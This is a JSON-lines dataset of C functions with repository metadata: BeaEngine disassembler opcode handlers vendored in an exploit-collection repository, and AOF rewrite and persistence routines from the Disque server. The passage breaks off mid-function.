{"docstring": "/* =======================================\n *      06eh\n * ======================================= */\n", "func_signal": "void __bea_callspec__ outsb_(PDISASM pMyDisasm)", "code": "{\n    if ((*pMyDisasm).Prefix.RepnePrefix == SuperfluousPrefix) {\n        (*pMyDisasm).Prefix.RepnePrefix = InUsePrefix;\n    }\n    if ((*pMyDisasm).Prefix.RepPrefix == SuperfluousPrefix) {\n        (*pMyDisasm).Prefix.RepPrefix = InUsePrefix;\n    }\n    (*pMyDisasm).Instruction.Category = GENERAL_PURPOSE_INSTRUCTION+InOutINSTRUCTION;\n    #ifndef BEA_LIGHT_DISASSEMBLY\n       (void) strcpy ((*pMyDisasm).Instruction.Mnemonic, \"outsb \");\n    #endif\n    (*pMyDisasm).Argument1.ArgType = REGISTER_TYPE+GENERAL_REG+REG2;\n    (*pMyDisasm).Argument1.ArgSize = 16;\n    (*pMyDisasm).Argument1.AccessMode = READ;\n    (*pMyDisasm).Argument2.ArgType = MEMORY_TYPE;\n    (*pMyDisasm).Argument2.Memory.BaseRegister = REG6;\n    (*pMyDisasm).Argument2.ArgSize = 8;\n    GV.EIP_++;\n    FillFlags(pMyDisasm, 76);\n}", "path": "windows-kernel-exploits/MS12-042/sysret-source/junk/sources/beaengineSources/Includes/instr_set/opcodes_N_Z.c", "commit_date": "2017-07-19 00:00:00", "repo_name": "SecWiki/windows-kernel-exploits", "stars": 7711, "license": "mit", "language": "c", "size": 244415}
{"docstring": "/* =======================================\n *      0f90h\n * ======================================= */\n", "func_signal": "void __bea_callspec__ setns_(PDISASM pMyDisasm)", "code": "{\n    (*pMyDisasm).Instruction.Category = GENERAL_PURPOSE_INSTRUCTION+BIT_UInt8;\n    #ifndef BEA_LIGHT_DISASSEMBLY\n       (void) strcpy ((*pMyDisasm).Instruction.Mnemonic, \"setns \");\n    #endif\n    GV.MemDecoration = Arg2byte;\n    GV.OperandSize = 8;\n    MOD_RM(&(*pMyDisasm).Argument2, pMyDisasm);\n    GV.OperandSize = 32;\n    GV.EIP_+= GV.DECALAGE_EIP+2;\n    FillFlags(pMyDisasm,95);\n}", "path": "windows-kernel-exploits/MS12-042/sysret-source/junk/sources/beaengineSources/Includes/instr_set/opcodes_N_Z.c", "commit_date": "2017-07-19 00:00:00", "repo_name": "SecWiki/windows-kernel-exploits", "stars": 7711, "license": "mit", "language": "c", "size": 244415}
{"docstring": "/* =======================================\n *      0f90h\n * ======================================= */\n", "func_signal": "void __bea_callspec__ setp_(PDISASM pMyDisasm)", "code": "{\n    (*pMyDisasm).Instruction.Category = GENERAL_PURPOSE_INSTRUCTION+BIT_UInt8;\n    #ifndef BEA_LIGHT_DISASSEMBLY\n       (void) strcpy ((*pMyDisasm).Instruction.Mnemonic, \"setp \");\n    #endif\n    GV.MemDecoration = Arg2byte;\n    GV.OperandSize = 8;\n    MOD_RM(&(*pMyDisasm).Argument2, pMyDisasm);\n    GV.OperandSize = 32;\n    GV.EIP_+= GV.DECALAGE_EIP+2;\n    FillFlags(pMyDisasm,95);\n}", "path": "windows-kernel-exploits/MS12-042/sysret-source/junk/sources/beaengineSources/Includes/instr_set/opcodes_N_Z.c", "commit_date": "2017-07-19 00:00:00", "repo_name": "SecWiki/windows-kernel-exploits", "stars": 7711, "license": "mit", "language": "c", "size": 244415}
{"docstring": "/* =======================================\n *      0f90h\n * ======================================= */\n", "func_signal": "void __bea_callspec__ setnp_(PDISASM pMyDisasm)", "code": "{\n    (*pMyDisasm).Instruction.Category = GENERAL_PURPOSE_INSTRUCTION+BIT_UInt8;\n    #ifndef BEA_LIGHT_DISASSEMBLY\n       (void) strcpy ((*pMyDisasm).Instruction.Mnemonic, \"setnp \");\n    #endif\n    GV.MemDecoration = Arg2byte;\n    GV.OperandSize = 8;\n    MOD_RM(&(*pMyDisasm).Argument2, pMyDisasm);\n    GV.OperandSize = 32;\n    GV.EIP_+= GV.DECALAGE_EIP+2;\n    FillFlags(pMyDisasm,95);\n}", "path": "windows-kernel-exploits/MS12-042/sysret-source/junk/sources/beaengineSources/Includes/instr_set/opcodes_N_Z.c", "commit_date": "2017-07-19 00:00:00", "repo_name": "SecWiki/windows-kernel-exploits", "stars": 7711, "license": "mit", "language": "c", "size": 244415}
{"docstring": "/* =======================================\n *      0fa4h\n * ======================================= */\n", "func_signal": "void __bea_callspec__ shld_EvGvIb(PDISASM pMyDisasm)", "code": "{\n    (*pMyDisasm).Instruction.Category = GENERAL_PURPOSE_INSTRUCTION+SHIFT_ROTATE;\n    #ifndef BEA_LIGHT_DISASSEMBLY\n       (void) strcpy ((*pMyDisasm).Instruction.Mnemonic, \"shld \");\n    #endif\n    GV.ImmediatSize = 8;\n    EvGv(pMyDisasm);\n    GV.EIP_+= 1;\n    if (!Security(0, pMyDisasm)) return;\n    GV.third_arg = 1;\n    (*pMyDisasm).Instruction.Immediat = *((UInt8*)(UIntPtr) (GV.EIP_- 1));\n    #ifndef BEA_LIGHT_DISASSEMBLY\n       (void) CopyFormattedNumber(pMyDisasm, (char*) (*pMyDisasm).Argument3.ArgMnemonic, \"%.8X\",(Int64) *((UInt8*)(UIntPtr) (GV.EIP_- 1)));\n    #endif\n    (*pMyDisasm).Argument3.ArgType = CONSTANT_TYPE+ABSOLUTE_;\n    (*pMyDisasm).Argument3.ArgSize = 8;\n\n    FillFlags(pMyDisasm, 97);\n}", "path": "windows-kernel-exploits/MS12-042/sysret-source/junk/sources/beaengineSources/Includes/instr_set/opcodes_N_Z.c", "commit_date": "2017-07-19 00:00:00", "repo_name": "SecWiki/windows-kernel-exploits", "stars": 7711, "license": "mit", "language": "c", "size": 244415}
{"docstring": "/* =======================================\n *      0f90h\n * ======================================= */\n", "func_signal": "void __bea_callspec__ sets_(PDISASM pMyDisasm)", "code": "{\n    (*pMyDisasm).Instruction.Category = GENERAL_PURPOSE_INSTRUCTION+BIT_UInt8;\n    #ifndef BEA_LIGHT_DISASSEMBLY\n       (void) strcpy ((*pMyDisasm).Instruction.Mnemonic, \"sets \");\n    #endif\n    GV.MemDecoration = Arg2byte;\n    GV.OperandSize = 8;\n    MOD_RM(&(*pMyDisasm).Argument2, pMyDisasm);\n    GV.OperandSize = 32;\n    GV.EIP_+= GV.DECALAGE_EIP+2;\n    FillFlags(pMyDisasm,95);\n}", "path": "windows-kernel-exploits/MS12-042/sysret-source/junk/sources/beaengineSources/Includes/instr_set/opcodes_N_Z.c", "commit_date": "2017-07-19 00:00:00", "repo_name": "SecWiki/windows-kernel-exploits", "stars": 7711, "license": "mit", "language": "c", "size": 244415}
{"docstring": "/* =======================================\n *      0f90h\n * ======================================= */\n", "func_signal": "void __bea_callspec__ seto_(PDISASM pMyDisasm)", "code": "{\n    (*pMyDisasm).Instruction.Category = GENERAL_PURPOSE_INSTRUCTION+BIT_UInt8;\n    #ifndef BEA_LIGHT_DISASSEMBLY\n       (void) strcpy ((*pMyDisasm).Instruction.Mnemonic, \"seto \");\n    #endif\n    GV.MemDecoration = Arg2byte;\n    GV.OperandSize = 8;\n    MOD_RM(&(*pMyDisasm).Argument2, pMyDisasm);\n    GV.OperandSize = 32;\n    GV.EIP_+= GV.DECALAGE_EIP+2;\n    FillFlags(pMyDisasm,95);\n}", "path": "windows-kernel-exploits/MS12-042/sysret-source/junk/sources/beaengineSources/Includes/instr_set/opcodes_N_Z.c", "commit_date": "2017-07-19 00:00:00", "repo_name": "SecWiki/windows-kernel-exploits", "stars": 7711, "license": "mit", "language": "c", "size": 244415}
{"docstring": "/* =======================================\n *      0c3h\n * ======================================= */\n", "func_signal": "void __bea_callspec__ ret_(PDISASM pMyDisasm)", "code": "{\n    (*pMyDisasm).Instruction.Category = GENERAL_PURPOSE_INSTRUCTION+CONTROL_TRANSFER;\n    (*pMyDisasm).Instruction.BranchType = RetType;\n    #ifndef BEA_LIGHT_DISASSEMBLY\n       (void) strcpy ((*pMyDisasm).Instruction.Mnemonic, \"ret \");\n    #endif\n    GV.EIP_++;\n    (*pMyDisasm).Argument2.ArgType = MEMORY_TYPE;\n    (*pMyDisasm).Argument2.ArgSize = 32;\n    (*pMyDisasm).Argument2.Memory.BaseRegister = REG4;\n    (*pMyDisasm).Instruction.ImplicitModifiedRegs = GENERAL_REG+REG4;\n}", "path": "windows-kernel-exploits/MS12-042/sysret-source/junk/sources/beaengineSources/Includes/instr_set/opcodes_N_Z.c", "commit_date": "2017-07-19 00:00:00", "repo_name": "SecWiki/windows-kernel-exploits", "stars": 7711, "license": "mit", "language": "c", "size": 244415}
{"docstring": "/* =======================================\n *      06fh\n * ======================================= */\n", "func_signal": "void __bea_callspec__ outsw_(PDISASM pMyDisasm)", "code": "{\n    if ((*pMyDisasm).Prefix.RepnePrefix == SuperfluousPrefix) {\n        (*pMyDisasm).Prefix.RepnePrefix = InUsePrefix;\n    }\n    if ((*pMyDisasm).Prefix.RepPrefix == SuperfluousPrefix) {\n        (*pMyDisasm).Prefix.RepPrefix = InUsePrefix;\n    }\n    (*pMyDisasm).Instruction.Category = GENERAL_PURPOSE_INSTRUCTION+InOutINSTRUCTION;\n    if (GV.OperandSize >= 32) {\n        #ifndef BEA_LIGHT_DISASSEMBLY\n           (void) strcpy ((*pMyDisasm).Instruction.Mnemonic, \"outsd \");\n        #endif\n        (*pMyDisasm).Argument1.ArgType = REGISTER_TYPE+GENERAL_REG+REG2;\n        (*pMyDisasm).Argument1.ArgSize = 16;\n        (*pMyDisasm).Argument1.AccessMode = READ;\n        (*pMyDisasm).Argument2.ArgType = MEMORY_TYPE;\n        (*pMyDisasm).Argument2.Memory.BaseRegister = REG6;\n        (*pMyDisasm).Argument2.ArgSize = 32;\n        GV.EIP_++;\n        FillFlags(pMyDisasm, 76);\n    }\n\n    else {\n        #ifndef BEA_LIGHT_DISASSEMBLY\n           (void) strcpy ((*pMyDisasm).Instruction.Mnemonic, \"outsw \");\n        #endif\n        (*pMyDisasm).Argument1.ArgType = REGISTER_TYPE+GENERAL_REG+REG2;\n        (*pMyDisasm).Argument1.ArgSize = 16;\n        (*pMyDisasm).Argument1.AccessMode = READ;\n        (*pMyDisasm).Argument2.ArgType = MEMORY_TYPE;\n        (*pMyDisasm).Argument2.Memory.BaseRegister = REG6;\n        (*pMyDisasm).Argument2.ArgSize = 16;\n        GV.EIP_++;\n        FillFlags(pMyDisasm, 76);\n    }\n}", "path": "windows-kernel-exploits/MS12-042/sysret-source/junk/sources/beaengineSources/Includes/instr_set/opcodes_N_Z.c", "commit_date": "2017-07-19 00:00:00", "repo_name": "SecWiki/windows-kernel-exploits", "stars": 7711, "license": "mit", "language": "c", "size": 244415}
{"docstring": "/* =======================================\n *      0f90h\n * ======================================= */\n", "func_signal": "void __bea_callspec__ sete_(PDISASM pMyDisasm)", "code": "{\n    (*pMyDisasm).Instruction.Category = GENERAL_PURPOSE_INSTRUCTION+BIT_UInt8;\n    #ifndef BEA_LIGHT_DISASSEMBLY\n       (void) strcpy ((*pMyDisasm).Instruction.Mnemonic, \"sete \");\n    #endif\n    GV.MemDecoration = Arg2byte;\n    GV.OperandSize = 8;\n    MOD_RM(&(*pMyDisasm).Argument2, pMyDisasm);\n    GV.OperandSize = 32;\n    GV.EIP_+= GV.DECALAGE_EIP+2;\n    FillFlags(pMyDisasm,95);\n}", "path": "windows-kernel-exploits/MS12-042/sysret-source/junk/sources/beaengineSources/Includes/instr_set/opcodes_N_Z.c", "commit_date": "2017-07-19 00:00:00", "repo_name": "SecWiki/windows-kernel-exploits", "stars": 7711, "license": "mit", "language": "c", "size": 244415}
{"docstring": "/* =======================================\n *      0f90h\n * ======================================= */\n", "func_signal": "void __bea_callspec__ setnle_(PDISASM pMyDisasm)", "code": "{\n    (*pMyDisasm).Instruction.Category = GENERAL_PURPOSE_INSTRUCTION+BIT_UInt8;\n    #ifndef BEA_LIGHT_DISASSEMBLY\n       (void) strcpy ((*pMyDisasm).Instruction.Mnemonic, \"setnle \");\n    #endif\n    GV.MemDecoration = Arg2byte;\n    GV.OperandSize = 8;\n    MOD_RM(&(*pMyDisasm).Argument2, pMyDisasm);\n    GV.OperandSize = 32;\n    GV.EIP_+= GV.DECALAGE_EIP+2;\n    FillFlags(pMyDisasm,95);\n}", "path": "windows-kernel-exploits/MS12-042/sysret-source/junk/sources/beaengineSources/Includes/instr_set/opcodes_N_Z.c", "commit_date": "2017-07-19 00:00:00", "repo_name": "SecWiki/windows-kernel-exploits", "stars": 7711, "license": "mit", "language": "c", "size": 244415}
{"docstring": "/* =======================================\n *      0f91h\n * ======================================= */\n", "func_signal": "void __bea_callspec__ setno_(PDISASM pMyDisasm)", "code": "{\n    (*pMyDisasm).Instruction.Category = GENERAL_PURPOSE_INSTRUCTION+BIT_UInt8;\n    #ifndef BEA_LIGHT_DISASSEMBLY\n       (void) strcpy ((*pMyDisasm).Instruction.Mnemonic, \"setno \");\n    #endif\n    GV.MemDecoration = Arg2byte;\n    GV.OperandSize = 8;\n    MOD_RM(&(*pMyDisasm).Argument2, pMyDisasm);\n    GV.OperandSize = 32;\n    GV.EIP_+= GV.DECALAGE_EIP+2;\n    FillFlags(pMyDisasm,95);\n}", "path": "windows-kernel-exploits/MS12-042/sysret-source/junk/sources/beaengineSources/Includes/instr_set/opcodes_N_Z.c", "commit_date": "2017-07-19 00:00:00", "repo_name": "SecWiki/windows-kernel-exploits", "stars": 7711, "license": "mit", "language": "c", "size": 244415}
{"docstring": "/* =======================================\n *      0f90h\n * ======================================= */\n", "func_signal": "void __bea_callspec__ setnbe_(PDISASM pMyDisasm)", "code": "{\n    (*pMyDisasm).Instruction.Category = GENERAL_PURPOSE_INSTRUCTION+BIT_UInt8;\n    #ifndef BEA_LIGHT_DISASSEMBLY\n       (void) strcpy ((*pMyDisasm).Instruction.Mnemonic, \"setnbe \");\n    #endif\n    GV.MemDecoration = Arg2byte;\n    GV.OperandSize = 8;\n    MOD_RM(&(*pMyDisasm).Argument2, pMyDisasm);\n    GV.OperandSize = 32;\n    GV.EIP_+= GV.DECALAGE_EIP+2;\n    FillFlags(pMyDisasm,95);\n}", "path": "windows-kernel-exploits/MS12-042/sysret-source/junk/sources/beaengineSources/Includes/instr_set/opcodes_N_Z.c", "commit_date": "2017-07-19 00:00:00", "repo_name": "SecWiki/windows-kernel-exploits", "stars": 7711, "license": "mit", "language": "c", "size": 244415}
{"docstring": "/* =======================================\n *      0fc1h\n * ======================================= */\n", "func_signal": "void __bea_callspec__ xadd_EvGv(PDISASM pMyDisasm)", "code": "{\n    if ((*pMyDisasm).Prefix.LockPrefix == InvalidPrefix) {\n        (*pMyDisasm).Prefix.LockPrefix = InUsePrefix;\n    }\n    (*pMyDisasm).Instruction.Category = GENERAL_PURPOSE_INSTRUCTION+DATA_TRANSFER;\n    #ifndef BEA_LIGHT_DISASSEMBLY\n       (void) strcpy ((*pMyDisasm).Instruction.Mnemonic, \"xadd \");\n    #endif\n    EvGv(pMyDisasm);\n    FillFlags(pMyDisasm,110);\n}", "path": "windows-kernel-exploits/MS12-042/sysret-source/junk/sources/beaengineSources/Includes/instr_set/opcodes_N_Z.c", "commit_date": "2017-07-19 00:00:00", "repo_name": "SecWiki/windows-kernel-exploits", "stars": 7711, "license": "mit", "language": "c", "size": 244415}
{"docstring": "/* =======================================\n *      0abh\n * ======================================= */\n", "func_signal": "void __bea_callspec__ stosw_(PDISASM pMyDisasm)", "code": "{\n    if ((*pMyDisasm).Prefix.RepnePrefix == SuperfluousPrefix) {\n        (*pMyDisasm).Prefix.RepnePrefix = InUsePrefix;\n    }\n    if ((*pMyDisasm).Prefix.RepPrefix == SuperfluousPrefix) {\n        (*pMyDisasm).Prefix.RepPrefix = InUsePrefix;\n    }\n    (*pMyDisasm).Instruction.Category = GENERAL_PURPOSE_INSTRUCTION+STRING_INSTRUCTION;\n    if (GV.OperandSize == 64) {\n        #ifndef BEA_LIGHT_DISASSEMBLY\n           (void) strcpy ((*pMyDisasm).Instruction.Mnemonic, \"stosq \");\n        #endif\n        (*pMyDisasm).Argument2.ArgType = REGISTER_TYPE+GENERAL_REG+REG0;\n        (*pMyDisasm).Argument2.ArgSize = 64;\n        (*pMyDisasm).Argument1.ArgType = MEMORY_TYPE;\n        (*pMyDisasm).Argument1.Memory.BaseRegister = REG7;\n        (*pMyDisasm).Argument1.ArgSize = 64;\n        (*pMyDisasm).Instruction.ImplicitModifiedRegs = GENERAL_REG+REG7;\n        GV.EIP_++;\n        FillFlags(pMyDisasm, 101);\n    }\n    else if (GV.OperandSize == 32) {\n        #ifndef BEA_LIGHT_DISASSEMBLY\n           (void) strcpy ((*pMyDisasm).Instruction.Mnemonic, \"stosd \");\n        #endif\n        (*pMyDisasm).Argument2.ArgType = REGISTER_TYPE+GENERAL_REG+REG0;\n        (*pMyDisasm).Argument2.ArgSize = 32;\n        (*pMyDisasm).Argument1.ArgType = MEMORY_TYPE;\n        (*pMyDisasm).Argument1.Memory.BaseRegister = REG7;\n        (*pMyDisasm).Argument1.ArgSize = 32;\n        (*pMyDisasm).Instruction.ImplicitModifiedRegs = GENERAL_REG+REG7;\n        GV.EIP_++;\n        FillFlags(pMyDisasm, 101);\n    }\n    else {\n        #ifndef BEA_LIGHT_DISASSEMBLY\n           (void) strcpy ((*pMyDisasm).Instruction.Mnemonic, \"stosw \");\n        #endif\n        (*pMyDisasm).Argument2.ArgType = REGISTER_TYPE+GENERAL_REG+REG0;\n        (*pMyDisasm).Argument2.ArgSize = 16;\n        (*pMyDisasm).Argument1.ArgType = MEMORY_TYPE;\n        (*pMyDisasm).Argument1.Memory.BaseRegister = REG7;\n        (*pMyDisasm).Argument1.ArgSize = 16;\n        (*pMyDisasm).Instruction.ImplicitModifiedRegs = GENERAL_REG+REG7;\n        GV.EIP_++;\n        FillFlags(pMyDisasm, 101);\n    }\n}", "path": "windows-kernel-exploits/MS12-042/sysret-source/junk/sources/beaengineSources/Includes/instr_set/opcodes_N_Z.c", "commit_date": "2017-07-19 00:00:00", "repo_name": "SecWiki/windows-kernel-exploits", "stars": 7711, "license": "mit", "language": "c", "size": 244415}
{"docstring": "/* =======================================\n *      0f90h\n * ======================================= */\n", "func_signal": "void __bea_callspec__ setne_(PDISASM pMyDisasm)", "code": "{\n    (*pMyDisasm).Instruction.Category = GENERAL_PURPOSE_INSTRUCTION+BIT_UInt8;\n    #ifndef BEA_LIGHT_DISASSEMBLY\n       (void) strcpy ((*pMyDisasm).Instruction.Mnemonic, \"setne \");\n    #endif\n    GV.MemDecoration = Arg2byte;\n    GV.OperandSize = 8;\n    MOD_RM(&(*pMyDisasm).Argument2, pMyDisasm);\n    GV.OperandSize = 32;\n    GV.EIP_+= GV.DECALAGE_EIP+2;\n    FillFlags(pMyDisasm,95);\n}", "path": "windows-kernel-exploits/MS12-042/sysret-source/junk/sources/beaengineSources/Includes/instr_set/opcodes_N_Z.c", "commit_date": "2017-07-19 00:00:00", "repo_name": "SecWiki/windows-kernel-exploits", "stars": 7711, "license": "mit", "language": "c", "size": 244415}
{"docstring": "/* =======================================\n *      0fach\n * ======================================= */\n", "func_signal": "void __bea_callspec__ shrd_EvGvIb(PDISASM pMyDisasm)", "code": "{\n    (*pMyDisasm).Instruction.Category = GENERAL_PURPOSE_INSTRUCTION+SHIFT_ROTATE;\n    #ifndef BEA_LIGHT_DISASSEMBLY\n       (void) strcpy ((*pMyDisasm).Instruction.Mnemonic, \"shrd \");\n    #endif\n    GV.ImmediatSize = 8;\n    EvGv(pMyDisasm);\n    GV.EIP_+= 1;\n    if (!Security(0, pMyDisasm)) return;\n    GV.third_arg = 1;\n    (*pMyDisasm).Instruction.Immediat = *((UInt8*)(UIntPtr) (GV.EIP_- 1));\n    #ifndef BEA_LIGHT_DISASSEMBLY\n       (void) CopyFormattedNumber(pMyDisasm, (char*) (*pMyDisasm).Argument3.ArgMnemonic, \"%.8X\",(Int64) *((UInt8*)(UIntPtr) (GV.EIP_- 1)));\n    #endif\n    (*pMyDisasm).Argument3.ArgType = CONSTANT_TYPE+ABSOLUTE_;\n    (*pMyDisasm).Argument3.ArgSize = 8;\n\n    FillFlags(pMyDisasm, 97);\n}", "path": "windows-kernel-exploits/MS12-042/sysret-source/junk/sources/beaengineSources/Includes/instr_set/opcodes_N_Z.c", "commit_date": "2017-07-19 00:00:00", "repo_name": "SecWiki/windows-kernel-exploits", "stars": 7711, "license": "mit", "language": "c", "size": 244415}
{"docstring": "/* =======================================\n *      0f90h\n * ======================================= */\n", "func_signal": "void __bea_callspec__ setle_(PDISASM pMyDisasm)", "code": "{\n    (*pMyDisasm).Instruction.Category = GENERAL_PURPOSE_INSTRUCTION+BIT_UInt8;\n    #ifndef BEA_LIGHT_DISASSEMBLY\n       (void) strcpy ((*pMyDisasm).Instruction.Mnemonic, \"setle \");\n    #endif\n    GV.MemDecoration = Arg2byte;\n    GV.OperandSize = 8;\n    MOD_RM(&(*pMyDisasm).Argument2, pMyDisasm);\n    GV.OperandSize = 32;\n    GV.EIP_+= GV.DECALAGE_EIP+2;\n    FillFlags(pMyDisasm,95);\n}", "path": "windows-kernel-exploits/MS12-042/sysret-source/junk/sources/beaengineSources/Includes/instr_set/opcodes_N_Z.c", "commit_date": "2017-07-19 00:00:00", "repo_name": "SecWiki/windows-kernel-exploits", "stars": 7711, "license": "mit", "language": "c", "size": 244415}
{"docstring": "/* Create the pipes used for parent - child process IPC during rewrite.\n * We have a data pipe used to send AOF incremental diffs to the child,\n * and two other pipes used by the children to signal it finished with\n * the rewrite so no more data should be written, and another for the\n * parent to acknowledge it understood this new condition. */\n", "func_signal": "int aofCreatePipes(void)", "code": "{\n    int fds[6] = {-1, -1, -1, -1, -1, -1};\n    int j;\n\n    if (pipe(fds) == -1) goto error; /* parent -> children data. */\n    if (pipe(fds+2) == -1) goto error; /* children -> parent ack. */\n    if (pipe(fds+4) == -1) goto error; /* children -> parent ack. */\n    /* Parent -> children data is non blocking. */\n    if (anetNonBlock(NULL,fds[0]) != ANET_OK) goto error;\n    if (anetNonBlock(NULL,fds[1]) != ANET_OK) goto error;\n    if (aeCreateFileEvent(server.el, fds[2], AE_READABLE, aofChildPipeReadable, NULL) == AE_ERR) goto error;\n\n    server.aof_pipe_write_data_to_child = fds[1];\n    server.aof_pipe_read_data_from_parent = fds[0];\n    server.aof_pipe_write_ack_to_parent = fds[3];\n    server.aof_pipe_read_ack_from_child = fds[2];\n    server.aof_pipe_write_ack_to_child = fds[5];\n    server.aof_pipe_read_ack_from_parent = fds[4];\n    server.aof_stop_sending_diff = 0;\n    return C_OK;\n\nerror:\n    serverLog(LL_WARNING,\"Error opening /setting AOF rewrite IPC pipes: %s\",\n        strerror(errno));\n    for (j = 0; j < 6; j++) if(fds[j] != -1) close(fds[j]);\n    return C_ERR;\n}", "path": "disque/src/aof.c", "commit_date": "2015-07-27 00:00:00", "repo_name": "antirez/disque", "stars": 7990, "license": "bsd-3-clause", "language": "c", "size": 2493}
{"docstring": "/* This function is called by the child rewriting the AOF file to read\n * the difference accumulated from the parent into a buffer, that is\n * concatenated at the end of the rewrite. */\n", "func_signal": "ssize_t aofReadDiffFromParent(void)", "code": "{\n    char buf[65536]; /* Default pipe buffer size on most Linux systems. */\n    ssize_t nread, total = 0;\n\n    while ((nread =\n            read(server.aof_pipe_read_data_from_parent,buf,sizeof(buf))) > 0) {\n        server.aof_child_diff = sdscatlen(server.aof_child_diff,buf,nread);\n        total += nread;\n    }\n    return total;\n}", "path": "disque/src/aof.c", "commit_date": "2015-07-27 00:00:00", "repo_name": "antirez/disque", "stars": 7990, "license": "bsd-3-clause", "language": "c", "size": 2493}
{"docstring": "/* Get the AOF state as string for INFO reporting. */\n", "func_signal": "char *aofGetStateString(void)", "code": "{\n    switch(server.aof_state) {\n    case AOF_OFF: return \"off\";\n    case AOF_ON: return \"on\";\n    case AOF_WAIT_REWRITE: return \"wait-rewrite\";\n    default: return \"unknown\";\n    }\n}", "path": "disque/src/aof.c", "commit_date": "2015-07-27 00:00:00", "repo_name": "antirez/disque", "stars": 7990, "license": "bsd-3-clause", "language": "c", "size": 2493}
{"docstring": "/* This function free the old AOF rewrite buffer if needed, and initialize\n * a fresh new one. It tests for server.aof_rewrite_buf_blocks equal to NULL\n * so can be used for the first initialization as well. */\n", "func_signal": "void aofRewriteBufferReset(void)", "code": "{\n    if (server.aof_rewrite_buf_blocks)\n        listRelease(server.aof_rewrite_buf_blocks);\n\n    server.aof_rewrite_buf_blocks = listCreate();\n    listSetFreeMethod(server.aof_rewrite_buf_blocks,zfree);\n}", "path": "disque/src/aof.c", "commit_date": "2015-07-27 00:00:00", "repo_name": "antirez/disque", "stars": 7990, "license": "bsd-3-clause", "language": "c", "size": 2493}
{"docstring": "/* A background append only file rewriting (BGREWRITEAOF) terminated its work.\n * Handle this. */\n", "func_signal": "void backgroundRewriteDoneHandler(int exitcode, int bysignal)", "code": "{\n    if (!bysignal && exitcode == 0) {\n        int newfd, oldfd;\n        char tmpfile[256];\n        long long now = ustime();\n        mstime_t latency;\n\n        serverLog(LL_NOTICE,\n            \"Background AOF rewrite terminated with success\");\n\n        /* Flush the differences accumulated by the parent to the\n         * rewritten AOF. */\n        latencyStartMonitor(latency);\n        snprintf(tmpfile,256,\"temp-rewriteaof-bg-%d.aof\",\n            (int)server.aof_child_pid);\n        newfd = open(tmpfile,O_WRONLY|O_APPEND);\n        if (newfd == -1) {\n            serverLog(LL_WARNING,\n                \"Unable to open the temporary AOF produced by the child: %s\", strerror(errno));\n            goto cleanup;\n        }\n\n        if (aofRewriteBufferWrite(newfd) == -1) {\n            serverLog(LL_WARNING,\n                \"Error trying to flush the parent diff to the rewritten AOF: %s\", strerror(errno));\n            close(newfd);\n            goto cleanup;\n        }\n        latencyEndMonitor(latency);\n        latencyAddSampleIfNeeded(\"aof-rewrite-diff-write\",latency);\n\n        serverLog(LL_NOTICE,\n            \"Residual parent diff successfully flushed to the rewritten AOF (%.2f MB)\", (double) aofRewriteBufferSize() / (1024*1024));\n\n        /* The only remaining thing to do is to rename the temporary file to\n         * the configured file and switch the file descriptor used to do AOF\n         * writes. We don't want close(2) or rename(2) calls to block the\n         * server on old file deletion.\n         *\n         * There are two possible scenarios:\n         *\n         * 1) AOF is DISABLED and this was a one time rewrite. The temporary\n         * file will be renamed to the configured file. When this file already\n         * exists, it will be unlinked, which may block the server.\n         *\n         * 2) AOF is ENABLED and the rewritten AOF will immediately start\n         * receiving writes. After the temporary file is renamed to the\n         * configured file, the original AOF file descriptor will be closed.\n         * Since this will be the last reference to that file, closing it\n         * causes the underlying file to be unlinked, which may block the\n         * server.\n         *\n         * To mitigate the blocking effect of the unlink operation (either\n         * caused by rename(2) in scenario 1, or by close(2) in scenario 2), we\n         * use a background thread to take care of this. First, we\n         * make scenario 1 identical to scenario 2 by opening the target file\n         * when it exists. The unlink operation after the rename(2) will then\n         * be executed upon calling close(2) for its descriptor. Everything to\n         * guarantee atomicity for this switch has already happened by then, so\n         * we don't care what the outcome or duration of that close operation\n         * is, as long as the file descriptor is released again. */\n        if (server.aof_fd == -1) {\n            /* AOF disabled */\n\n             /* Don't care if this fails: oldfd will be -1 and we handle that.\n              * One notable case of -1 return is if the old file does\n              * not exist. */\n             oldfd = open(server.aof_filename,O_RDONLY|O_NONBLOCK);\n        } else {\n            /* AOF enabled */\n            oldfd = -1; /* We'll set this to the current AOF filedes later. */\n        }\n\n        /* Rename the temporary file. This will not unlink the target file if\n         * it exists, because we reference it with \"oldfd\". */\n        latencyStartMonitor(latency);\n        if (rename(tmpfile,server.aof_filename) == -1) {\n            serverLog(LL_WARNING,\n                \"Error trying to rename the temporary AOF file: %s\", strerror(errno));\n            close(newfd);\n            if (oldfd != -1) close(oldfd);\n            goto cleanup;\n        }\n        latencyEndMonitor(latency);\n        latencyAddSampleIfNeeded(\"aof-rename\",latency);\n\n        if (server.aof_fd == -1) {\n            /* AOF disabled, we don't need to set the AOF file descriptor\n             * to this new file, so we can close it. */\n            close(newfd);\n        } else {\n            /* AOF enabled, replace the old fd with the new one. */\n            oldfd = server.aof_fd;\n            server.aof_fd = newfd;\n            if (server.aof_fsync == AOF_FSYNC_ALWAYS)\n                aof_fsync(newfd);\n            else if (server.aof_fsync == AOF_FSYNC_EVERYSEC)\n                aof_background_fsync(newfd);\n            server.aof_selected_db = -1; /* Make sure SELECT is re-issued */\n            aofUpdateCurrentSize();\n            server.aof_rewrite_base_size = server.aof_current_size;\n\n            /* Clear regular AOF buffer since its contents was just written to\n             * the new AOF from the background rewrite buffer. */\n            sdsfree(server.aof_buf);\n            server.aof_buf = sdsempty();\n        }\n\n        server.aof_lastbgrewrite_status = C_OK;\n\n        serverLog(LL_NOTICE, \"Background AOF rewrite finished successfully\");\n        /* Change state from WAIT_REWRITE to ON if needed */\n        if (server.aof_state == AOF_WAIT_REWRITE)\n            server.aof_state = AOF_ON;\n\n        /* Asynchronously close the overwritten AOF. */\n        if (oldfd != -1) bioCreateBackgroundJob(BIO_CLOSE_FILE,(void*)(long)oldfd,NULL,NULL);\n\n        serverLog(LL_VERBOSE,\n            \"Background AOF rewrite signal handler took %lldus\", ustime()-now);\n    } else if (!bysignal && exitcode != 0) {\n        server.aof_lastbgrewrite_status = C_ERR;\n\n        serverLog(LL_WARNING,\n            \"Background AOF rewrite terminated with error\");\n    } else {\n        server.aof_lastbgrewrite_status = C_ERR;\n\n        serverLog(LL_WARNING,\n            \"Background AOF rewrite terminated by signal %d\", bysignal);\n    }\n\ncleanup:\n    aofClosePipes();\n    aofRewriteBufferReset();\n    aofRemoveTempFile(server.aof_child_pid);\n    server.aof_child_pid = -1;\n    server.aof_rewrite_time_last = time(NULL)-server.aof_rewrite_time_start;\n    server.aof_rewrite_time_start = -1;\n    /* Schedule a new rewrite if we are waiting for it to switch the AOF ON. */\n    if (server.aof_state == 